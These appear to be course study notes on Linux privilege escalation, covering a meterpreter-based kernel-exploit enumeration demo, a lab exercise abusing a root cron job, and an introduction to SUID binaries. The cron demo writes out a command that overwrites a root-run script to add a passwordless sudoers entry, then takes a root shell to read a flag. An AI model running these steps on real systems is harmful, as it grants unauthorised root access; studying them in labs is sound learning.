# Linux Kernel Exploits
- Kernel exploits on Linux will typically target vulnerabilites in the Linux kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.
- This process will differ based on the Kernel version and distribution being targeted and the kernel exploit being used.
- Privesc on Linux systems will typically follow the following methodology:
  - Identifying kernel vulnerabilities
  - Downloading, compiling and transferring kernel exploits onto the target system.

## Tools & Environment
- Linux-Exploit-Suggester - This tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. It assesses (using heuristics methods) the exposure of the given kernel on every publicly known Linux kernel exploit.

## Demo: Linux Kernel Exploits

After we obtained a meterpreter session, we enumerate info:

`sysinfo`

`getuid`

www-data is a service account which is often used on linux system which host a webserver.
`shell`

`/bin/bash -i`

`cat /etc/passwd`

`sudo apt-get update`

We use the Linux Exploit Suggester:

meterpreter: `CD /TMP`

meterpreter: `ls`

meterpreter: `upload ~/Desktop/Linux-Enum/les.sh`

meterpreter: `shell`

meterpreter: `ls`

meterpreter: `chmod +x les.sh`

meterpeter: `ls -alps`

meterpeter: `./les.sh`

Gives us Exploits and OS information. We download the exploit from the website. Navigate to the Exploit download.

# Exploiting misconfigured Cron Jobs

## Understanding Cron Jobs

    Cron: A time-based service in Linux used to schedule and automate tasks.
    Cron Job: A task scheduled to run via Cron, such as backups or system upgrades.
    Crontab File: The configuration file where Cron jobs are stored.

## Privilege Escalation Using Cron Jobs

    Cron Jobs as Root: If misconfigured, Cron jobs running as "root" can be exploited for root access.

## Demo: Using Cronjob

  `whoami`
  Displays the current user’s username.

  `groups student`
  Shows the groups that the "student" user belongs to.

  `cat /etc/passwd`
  Displays the content of the /etc/passwd file, revealing user account information.

  `crontab -l`
  Lists the Cron jobs scheduled for the current user.

  `ls -al`
  Lists all files and directories in the current directory with detailed information.

  `cat message`
  Displays the content of the "message" file.

  `pwd`
  Prints the current working directory.

  `cd /`
  Changes the directory to the root (/) of the filesystem.

  `grep -rnw /usr -e "/home/student/message"`
  Recursively searches for the string "/home/student/message" in files under /usr.

  `ls -al /tmp`
  Lists all files in the /tmp directory with detailed information.

  `cat /tmp/message`
  Displays the content of the "message" file in the /tmp directory.

  `ls -al /usr/local/share/copy.sh`
  Lists detailed information about the copy.sh script.

  `cat /usr/local/share/copy.sh`
  Displays the content of the copy.sh script.

  `printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' >
/usr/local/share/copy.sh`
  Creates or modifies the copy.sh script to add a command that gives the "student" user root privileges.

  `sudo -l`
  Lists the commands that the current user can run with sudo.

  `sudo su`
  Switches to the root user if allowed by sudo.

  `whoami`
  Confirms the current user, which should now be root.

  `cd /root`
  Changes the directory to the root user's home directory.

  `ls`
  Lists files in the current directory.

  `cat flag`
  Displays the content of the "flag" file.

  `crontab -l`
  Re-checks the scheduled Cron jobs to verify any changes.

# Exploiting SUID Binaries
- In addition to the three main file access permissions (read, write and execute), Linux also provides users with specialised permissions that can be utilized in specific situations. One of these access permissions is the SUID (Set Owner User ID) permission.
- When applied, this permission provides users with the ability to execute a script or binary with the permissions of the file owner as opposed to the user that is running the script or binary.
- SUID permissions are typically used to provide unprivileged users with the ability to run specific scripts or binaries with "root" permissions. It is to be noted, however, that the provision of elevate privileges is limited to the execution of the script and does not translate to elevation of privileges, however, if inproperly configured unprivileged users can exploit misconfigurations or vulnerabilities within the binary or script to obtain an elevated session.


